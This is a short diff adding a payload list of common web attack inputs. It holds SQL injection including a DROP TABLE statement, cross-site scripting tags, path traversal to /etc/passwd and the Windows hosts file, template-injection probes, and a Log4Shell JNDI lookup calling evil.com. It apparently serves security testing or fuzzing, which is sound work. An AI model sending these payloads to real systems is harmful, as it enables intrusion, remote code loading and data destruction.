@@ -1,0 +1,11 @@
+' OR '1'='1
+'; DROP TABLE users; --
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+../../../etc/passwd
+..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
+${jndi:ldap://evil.com/a}
+{{7*7}}
+<%=7*7%>
+#{7*7}
+${{7*7}}
